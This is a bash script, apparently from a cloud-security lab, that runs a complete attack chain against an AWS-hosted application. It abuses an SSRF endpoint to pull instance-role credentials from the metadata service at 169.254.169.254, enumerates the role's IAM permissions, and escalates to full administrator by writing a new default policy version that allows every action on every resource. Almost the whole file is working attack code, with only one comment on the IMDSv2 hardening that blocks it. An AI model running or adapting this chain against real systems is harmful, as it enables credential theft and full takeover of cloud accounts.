#!/usr/bin/env bash
# Metadata Mirage - full offensive chain.
# SSRF -> IMDS creds -> identity pivot -> IAM enumeration -> privesc-to-admin.
#
# Usage: attack.sh <target_ip> <app_port> <role_name> <app_policy_arn>
# Requires: curl, jq, aws cli.
set -uo pipefail

TARGET="${1:?target ip required}"
PORT="${2:?app port required}"
ROLE="${3:?role name required}"
POLICY_ARN="${4:?app policy arn required}"

IMDS="http://169.254.169.254/latest/meta-data/iam/security-credentials"
SSRF="http://${TARGET}:${PORT}/fetch?url="

banner() { echo; echo "=== $* ==="; }

banner "1. SSRF -> leak the instance role name from IMDS"
ROLE_NAME="$(curl -s "${SSRF}${IMDS}/")"
echo "leaked role: ${ROLE_NAME}"

banner "2. SSRF -> steal the role's temporary credentials"
CREDS="$(curl -s "${SSRF}${IMDS}/${ROLE_NAME}")"
echo "${CREDS}"

AKID="$(echo "${CREDS}" | jq -r '.AccessKeyId // empty')"
SAK="$(echo "${CREDS}" | jq -r '.SecretAccessKey // empty')"
TOK="$(echo "${CREDS}" | jq -r '.Token // empty')"

if [ -z "${AKID}" ]; then
  echo
  echo ">> No credentials returned."
  echo ">> If IMDSv2 is enforced, the attacker's plain GET to IMDS is rejected."
  echo ">> That is the HARDENED state - the chain dies right here. Nothing to escalate."
  exit 0
fi

# From here on every AWS call runs AS the stolen instance role.
export AWS_ACCESS_KEY_ID="${AKID}"
export AWS_SECRET_ACCESS_KEY="${SAK}"
export AWS_SESSION_TOKEN="${TOK}"

banner "3. Pivot -> confirm who we are with the stolen creds"
aws sts get-caller-identity

banner "4. Enumerate -> what is this role allowed to do?"
aws iam list-attached-role-policies --role-name "${ROLE}"
echo "--- current (default) version of the app policy ---"
VER="$(aws iam get-policy --policy-arn "${POLICY_ARN}" --query 'Policy.DefaultVersionId' --output text)"
aws iam get-policy-version --policy-arn "${POLICY_ARN}" --version-id "${VER}" \
  --query 'PolicyVersion.Document' --output json
echo ">> Note: the role can CreatePolicyVersion + SetDefaultPolicyVersion on its OWN policy."

banner "5. Boundary check BEFORE privesc (expected: AccessDenied)"
aws iam list-users --max-items 1 || echo "(denied, as expected - not admin yet)"

banner "6. PRIVESC -> overwrite our own attached policy with *:* and set it default"
cat > /tmp/mirage-admin.json <<'ADMIN_EOF'
{
  "Version": "2012-10-17",
  "Statement": [ { "Effect": "Allow", "Action": "*", "Resource": "*" } ]
}
ADMIN_EOF
aws iam create-policy-version \
  --policy-arn "${POLICY_ARN}" \
  --policy-document file:///tmp/mirage-admin.json \
  --set-as-default

echo "waiting for policy propagation..."
sleep 10

banner "7. Boundary check AFTER privesc (expected: now allowed = full admin)"
aws iam list-users --max-items 5

banner "DONE"
echo "Scoped app role -> full administrator, via one SSRF and one IAM API call."
